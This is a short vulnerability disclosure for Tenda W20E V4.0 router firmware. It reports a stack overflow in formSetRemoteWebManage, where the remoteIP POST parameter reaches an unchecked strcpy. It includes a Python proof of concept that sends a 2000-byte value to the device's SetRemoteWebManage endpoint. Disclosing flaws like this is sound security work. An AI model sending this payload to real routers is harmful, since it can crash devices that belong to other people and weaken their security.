## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2707.html

## Affected version

W20EV4.0 V15.11.0.6

## Vulnerability details

The Tenda W20EV4.0 V15.11.0.6 firmware has a stack overflow vulnerability in the `formSetRemoteWebManage` function. The `ip` variable receives the `remoteIP` parameter from a POST request and is used in statement `strcpy((char *)temp_value, (const char *)ip);`, which caused the buffer overflow attack.

![image-20240409130925063](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409130925063.png)

![image-20240409130854266](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409130854266.png)

![image-20240409130910804](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409130910804.png)

The user-provided `remoteIP` can trigger this security vulnerability.

## POC

```python
import requests

IP = "192.168.84.101"
url = f"http://{IP}/goform/SetRemoteWebManage"
payload = b'a'*2000
data = {"remoteType": 1,"remoteIP": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409110959426](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)

